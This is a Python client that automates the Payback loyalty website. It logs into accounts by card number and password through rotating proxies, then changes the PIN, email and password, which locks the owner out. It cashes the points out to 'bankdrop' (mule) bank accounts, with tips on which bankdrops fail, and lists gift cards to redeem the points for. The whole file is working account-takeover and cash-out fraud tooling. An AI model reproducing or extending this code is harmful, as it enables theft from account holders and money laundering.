from colorama import Fore, init, Style
import requests
import re
import os
import time
import json
import sys, urllib.request
def clear(): return os.system('clear')

class PaybackClient:
    def generate_csrf_token(self):
        try:
            site_text = self.client.get("https://payback.de/login").text
            csrf_token = re.search(
                'name="_csrf" value="(.*)" ><div class="js-secureLogin">', site_text)
            return csrf_token.group(1)
        except AttributeError: 
            print(Fore.RED + "[*] Unable to Connect to Payback Server & fetch the csrf token." + Fore.CYAN)

    def fetch_custom_csrf(self, endpoint):
        try:
            xsrf_request = self.client.get(str(endpoint))
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + "[*] Connection to Payback Server Timed out. Please try again.")
            return        
        xsrf_token = re.search('" name="_csrf" value="(.*)" ><link rel="stylesheet"', xsrf_request.text).group(1)
        return xsrf_token

    def __init__(self, card_number, password, timeout=7):
        self.proxy_address = None
        self.proxy_port = None
        self.proxytype = None
        self.client = requests.session()
        csrf_token = self.generate_csrf_token()
        self.card_number = card_number
        self.password = password
        self.login_status = False

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0 Win64 x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
        }

        data = {
            "login-method": "pwd",
            "SITE_NAME": "payback-main-page",
            "_csrf": str(csrf_token),
            "aliasTypePassName": str(card_number),
            "passwordName": str(password),
            "cardNumberTypeDobZipName": "",
            "dobDayName": "",
            "dobMonthName": "",
            "dobYearName": "",
            "zipName": "",
            "getCardNumberTypePinName": "",
            "pinName": "",
            "__checkbox_usePermLogin": True,
            "permLogin": True,
            "redirectUrlName": "https://www.payback.de/logout",
            "redirectErrorUrlName": "/login"
        }

        try:
            login_request = self.client.post("https://www.payback.de/resources/action/login/login-action", data=data, headers=headers, timeout=timeout)
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            self.login_status = False
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + "[*] Connection to Payback Server Timed out. Please try again.")
            self.login_status = False
            
        if login_request.status_code == 200 and login_request.url == 'https://www.payback.de/logout':
            self.login_status = True
            time.sleep(3)
        else:
            self.login_status = False

    def check_proxy(self, proxy, port, proxytype):
        if proxytype == "http" or proxytype == "https":
            try:
                self.client.get("https://payback.com", proxies={
                    'http':'http://%s:%s' % (proxy, port),
                    'https':'https://%s:%s' % (proxy, port)
                }, timeout=10)
                return True
            except requests.exceptions.ProxyError:
                return False
            except requests.exceptions.ConnectionError:
                return False
        if proxytype == "socks5":
            try:
                self.client.get("https://payback.com", proxies={
                    'http':'socks5://%s:%s' % (proxy, port),
                    'https':'socks5://%s:%s' % (proxy, port)
                }, timeout=10)
                return True
            except requests.exceptions.ProxyError:
                return False
            except requests.exceptions.ConnectionError:
                return False
        if proxytype == "socks4":
            try:
                self.client.get("https://payback.com", proxies={
                    'http':'socks4://%s:%s' % (proxy, port),
                    'https':'socks4://%s:%s' % (proxy, port)
                }, timeout=10)
                return True
            except requests.exceptions.ProxyError:
                return False
            except requests.exceptions.ConnectionError:
                return False

    def set_proxy(self, proxy, port, proxytype):
        if (self.check_proxy(proxy, port, proxytype)) == False:
            return False
        self.proxy_address = proxy
        self.proxy_port = port
        self.proxytype = proxytype
        self.client.proxies = {
            'http': '%s://%s:%s' % (self.proxytype, self.proxy_address, self.proxy_port),
            'https': '%s://%s:%s' % (self.proxytype, self.proxy_address, self.proxy_port),
        }
        
        return True

    def logout(self):
        try:
            logout_request = self.client.get("https://www.payback.de/logout")
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return
        
    def change_pin(self, new_pin):
        try:
            pin_request = self.client.post(
                "https://www.payback.de/ajax/common/validate/pin/130264", data={
                    "newPin": new_pin,
                }, headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "X-SITE_NAME": "payback-main-page",
                    "X-XSRF-TOKEN": str(self.fetch_custom_csrf("https://www.payback.de/info/mein-payback/zugangsdaten"))
                })
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return
        
        # Validate first step
        if pin_request.status_code == 200:
            # First step successful
            try:
                pin_request_validate = self.client.post("https://www.payback.de/ajax/credentials/changePin/130264", data={
                    "pin": "****",
                    "newPin": new_pin
                }, headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "X-SITE_NAME": "payback-main-page",
                    "X-XSRF-TOKEN": str(self.fetch_custom_csrf("https://www.payback.de/info/mein-payback/zugangsdaten"))
                })
            except requests.ConnectionError:
                print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
                return

            # Validate second step
            if pin_request_validate.status_code == 200:
                if "apiValidationErrors" in pin_request_validate.json():
                    if "backend" in pin_request_validate.json()["apiValidationErrors"]:
                        print(Fore.RED + json.loads(pin_request_validate.text)[
                            'apiValidationErrors']["backend"]["message"])
                    else:
                        print(Fore.RED + "[Unknown Error] " + str(pin_request_validate.text) + Fore.CYAN)
                    return False
                if pin_request_validate.json().get("successMessage") == "Sie haben ihre PIN erfolgreich geändert.":
                    # Second step successful
                    return True

    def change_email(self, new_email):#
        try:
            email_change_request = self.client.post("https://www.payback.de/ajax/credentials/changeEmail/130244", data={
                "oldEmail": "dagobert@rules.com",
                "email": new_email
            }, headers={
                "X-Requested-With": "XMLHttpRequest",
                "X-SITE_NAME": "payback-main-page",
                "X-XSRF-TOKEN": str(self.fetch_custom_csrf("https://www.payback.de/info/mein-payback/zugangsdaten"))
            })
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return
                
        if email_change_request.status_code == 200:
            return True
        else:
            if "apiValidationErrors" in email_change_request.json():
                if email_change_request.json()["apiValidationErrors"]["email"]["message"] == "E-Mail Adresse im System bereits vorhanden":
                    print(Fore.YELLOW + "[*] Email Already existst in Payback Database! Please choose another Email Address." + Fore.CYAN)
                    return False
                elif email_change_request.json()["apiValidationErrors"]["email"]["message"] == "Ungültige E-Mail-Adresse.":
                    print(Fore.YELLOW + "[*] The Email given seems to be invalid! Please choose another Email Address." + Fore.CYAN)
                    return False
                
    def change_password(self, new_password):
        try:
            password_change_request = self.client.post("https://www.payback.de/ajax/credentials/changePassword/130260", data={
                "password": "**********",
                "newPassword": new_password,
                "passwordStrength": 4
            }, headers={
                "X-Requested-With": "XMLHttpRequest",
                "X-SITE_NAME": "payback-main-page",
                "X-XSRF-TOKEN": str(self.fetch_custom_csrf("https://www.payback.de/info/mein-payback/zugangsdaten"))
            })
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return

        if password_change_request.status_code == 200:
            return True
        return False

    def get_amount_of_points(self):
        try:
            points_request = self.client.get("https://www.payback.de/info/mein-payback/banktransferredemption").text
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return
        points = re.search('</strong>! Du hast <a href=/punktekonto><strong>(.*) °P</strong></a></div>', points_request).group(1)
        return int(points.replace(".", ""))

    def get_account_information(self):
        try:
            account_information_request = self.client.get("https://www.payback.de/punktekonto")
            address_information_request = self.client.get("https://www.payback.de/info/mein-payback/ersatzkarte")
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return
        card_numer = re.search('<span slot="member-card-number">(.*)</span>', account_information_request.text).group(1)
        account_full_name = re.search('<span slot="member-name">(.*)</span>', account_information_request.text).group(1).replace("&nbsp;", " ")
        city_information = re.search('<p id="city">(.*)</p>', address_information_request.text).group(1)
        city = city_information.split(" ")[1]
        postal_code = city_information.split(" ")[0]
        first_name = account_full_name.split(" ")[0]
        last_name = account_full_name.split(" ")[1]
        
        return {
            "first_name": first_name,
            "last_name": last_name,
            "card_numer": card_numer,
            "postal": postal_code,
            "city": city
        }

    def cashout_to_bd(self, points, bankdrop):
        # SumUp Bankdrop detection
        if "SUMU" in bankdrop and bankdrop.startswith("IE"):
            print(Fore.CYAN + "[i] SumUp Bankdrops are known to be incompatible sometimes. Please use a different bankdrop if you encounter an Error.")
        try:
            cashout_request = self.client.post(
                "https://www.payback.de/ajax/redemption/bankTransfer/139238", data={
                    "points_all": self.get_amount_of_points(),
                    "points": points,
                    "iban": bankdrop
                }, headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "X-SITE_NAME": "payback-main-page",
                    "X-XSRF-TOKEN": str(self.fetch_custom_csrf("https://www.payback.de/info/mein-payback/banktransferredemption"))
                })
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return

        if "apiValidationErrors" in cashout_request.json():
            if "backend" in cashout_request.json()["apiValidationErrors"]:
                if cashout_request.json()["apiValidationErrors"]["backend"]["message"] == "Bitte die eingegebene IBAN überprüfen.":
                    print(Fore.YELLOW + "[*] Withdrawal failed. Something seems off about your IBAN. Try again or use another Bankdrop." + Fore.CYAN)
                else:
                    print(Fore.RED + "[*] Widthdrawal failed. Unkown Error ("+str(cashout_request.text)+")" + Fore.CYAN)
            if "points" in cashout_request.json()["apiValidationErrors"]:
                    if cashout_request.json()["apiValidationErrors"]["points"]["message"] == "Es existieren nicht genügend einlösbare PAYBACK Punkte.":
                        print(Fore.YELLOW + "[*] Withdrawal failed. There are not enough points available. Maybe some are locked?" + Fore.CYAN)
        elif "successMessage" in cashout_request.json():
            if cashout_request.json().get("successMessage") == "<p>Die Punkte wurden erfolgreich eingelöst. Der Geldbetrag wird innerhalb der nächsten 7 Tage auf das angegebene Konto überwiesen.</p>":
                print(Fore.MAGENTA + "[*] Successfully transferred " + Style.BRIGHT + str(points) + Style.NORMAL +
                      " Points to your Bankdrop. The Money might take a day to arrive. (" + Style.BRIGHT+str(int(points) / 100) + Style.NORMAL+"€ Sent)" + Fore.CYAN)
        else:
            print(Fore.RED + "[*] An unknown Error occured. Please try again.")
    
    def add_to_cart(self, giftcard):
        try:
            add_to_cart_request = self.client.get("https://www.payback.de/ajax/add-reward?sku=" + giftcard["sku"], headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "X-SITE_NAME": "payback-main-page",
                    "X-XSRF-TOKEN": str(self.fetch_custom_csrf(giftcard["link"]))
                })
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return False
        
        if add_to_cart_request.status_code == 200:
            return True
        return False
        
    def remove_from_cart(self, itemid):
        try:
            remove_from_cart_request = self.client.post("https://www.payback.de/resources/action/cart/delete", data={
                    "itemId": str(itemid),
                }, headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "X-SITE_NAME": "payback-main-page",
                    "X-XSRF-TOKEN": str(self.fetch_custom_csrf("https://www.payback.de/praemien/warenkorb"))
                })
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return False
        
        if remove_from_cart_request.status_code == 200:
            return True
        return False
        
    def start_checkout(self):
        try:
            first_checkout_post_request = self.client.post("https://www.payback.de/resources/json/checkout", data={}, headers={})
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return False
        
        try:
            first_checkout_get_request = self.client.post("https://checkout.payback.de/index.php/checkout/", headers={})
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return False
        print(first_checkout_get_request.status_code)

    def list_giftcards(self):
        try:
            giftcard_page_request = self.client.get("https://www.payback.de/praemien/kategorie/Giftcarde?page=7")
        except requests.ConnectionError:
            print(Fore.YELLOW + "[*] Connection to Payback Server Failed. Please try again.")
            return
        
        giftcards = [
            # Zalando
                {
                    "name": "Zalando 5€ Giftcard",
                    "price": 5,
                    "points": 499,
                    "link": "https://www.payback.de/praemien/produkt/zalando-Giftcard-wert-5-euro_9220767",
                    "sku": "9220767"
                },
                {
                    "name": "Zalando 10€ Giftcard",
                    "price": 10,
                    "points": 999,
                    "link": "https://www.payback.de/praemien/produkt/zalando-Giftcard-wert-10-euro_9220584",
                    "sku": "9220584"
                },
                {
                    "name": "Zalando 25€ Giftcard",
                    "price": 25,
                    "points": 2499,
                    "link": "https://www.payback.de/praemien/produkt/zalando-Giftcard-wert-25-euro_9220585",
                    "sku": "9220585"
                }
            # WunschGutschein
                ,{
                    "name": "WunschGutschein 5€",
                    "price": 15,
                    "points": 1499,
                    "link": "https://www.payback.de/praemien/produkt/WunschGutschein-wert-15-euro_9220822",
                    "sku": "9220822"
                },   
                {
                    "name": "WunschGutschein 50€",
                    "price": 50,
                    "points": 4999,
                    "link": "https://www.payback.de/praemien/produkt/WunschGutschein-wert-50-euro_9220824",
                    "sku": "9220824"
                },   
                {
                    "name": "WunschGutschein 100€",
                    "price": 100,
                    "points": 99999,
                    "link": "https://www.payback.de/praemien/produkt/WunschGutschein-wert-100-euro_9220825",
                    "sku": "9220825"
                }
            # OTTO
                ,{
                    "name": "OTTO 10€ Giftcard",
                    "price": 10,
                    "points": 999,
                    "link": "https://www.payback.de/praemien/produkt/otto-Giftcard-wert-100-euro_9220781",
                    "sku": "9220781"
                },   
                {
                    "name": "OTTO 50€ Giftcard",
                    "price": 50,
                    "points": 4999,
                    "link": "https://www.payback.de/praemien/produkt/otto-Giftcard-wert-50-euro_9220780",
                    "sku": "9220780"
                },   
                {
                    "name": "OTTO 100€ Giftcard",
                    "price": 100,
                    "points": 99999,
                    "link": "https://www.payback.de/praemien/produkt/otto-Giftcard-wert-10-euro_9220778",
                    "sku": "9220778"
                }
        ]
        
        return giftcards
